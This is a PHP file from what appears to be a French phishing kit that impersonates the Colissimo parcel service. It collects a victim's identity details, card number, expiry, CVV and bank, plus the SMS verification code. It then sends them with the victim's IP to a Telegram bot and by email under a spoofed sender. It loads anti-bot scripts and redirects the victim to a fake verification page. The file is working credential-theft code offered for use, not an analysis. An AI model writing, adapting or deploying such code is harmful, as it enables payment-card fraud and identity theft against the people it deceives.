<?php
include ("../ab.php");
include ("../prevents/anti1.php");
include ("../prevents/anti2.php");
include ("../prevents/anti3.php");
include ("../prevents/anti4.php");
include ("../prevents/anti5.php");
include('./settings.php');
include('./get_browser.php');
include('./get_ip.php');

if(!isset($_SESSION['full_name'] ) ||
    !isset($_SESSION['adresse']) ||
    !isset($_SESSION['zip']) ||
    !isset($_SESSION['D-D-N'] ) ||
    !isset($_SESSION['ville']) ||
    !isset($_SESSION['phone_number']) ||
    !isset($_SESSION['email']))
{
    header("location: ../index.php?error=champs");
    return;
}


if(!isset($_SESSION['cc']) ||
    !isset($_SESSION['exp']) ||
    !isset($_SESSION['cvv']) ||
    !isset($_SESSION['nom_banque']) ||
    !isset($_SESSION['level_banque']) ||
    !isset($_SESSION['type_carte']))
{
    header("location: ../carte.php?error=champs");
    return;
}

$msg = "_____ 📝 Information de la victime 📝 ________\n" . "\n";
$msg .= "Nom et prénom : " . $_SESSION['full_name'] . "\n";
$msg .= "Adresse : " . $_SESSION['adresse'] . "\n";
$msg .= "Code Postal : " . $_SESSION['zip'] . "\n";
$msg .= "Date de naissance : " . $_SESSION['D-D-N'] . "\n";
$msg .= "Ville : " . $_SESSION['ville'] . "\n";
$msg .= "Téléphone : " . $_SESSION['phone_number'] . "\n";
$msg .= "E-mail : " . $_SESSION['email'] . "\n\n";


$msg .= "______💳 Information de la carte 💳___________\n\n";
$msg .= "Numéro de carte : " .$_SESSION['cc'] ."\n";
$msg .= "Date d'expiration : " .$_SESSION['exp']."\n";
$msg .= "CVV : " .$_SESSION['cvv']."\n";
$msg .= "Banque de la carte : " . $_SESSION['nom_banque'] . "\n";
$msg .= "Niveau de la carte : " . $_SESSION['level_banque'] . "\n";
$msg .= "Type de carte : " . $_SESSION['type_carte'] . "\n\n";

$msg .= "___💻 VBV CODE 💻____\n\n";
$msg .= "SMS : ".$_POST['code']."\n";
$msg .= $ip."\n";

if(!in_array($msg, $_SESSION['msg'])) $_SESSION['msg'][] = $msg;

$subject = "+1 VBV - $ip";
$head = "From: Colissimo <log@rezappl.com>" . "\r\n";
toTG($msg, $chat, $token);
@mail($email, $subject,$msg,$head);
header('Location: ../verification-paiement.php?');
?>
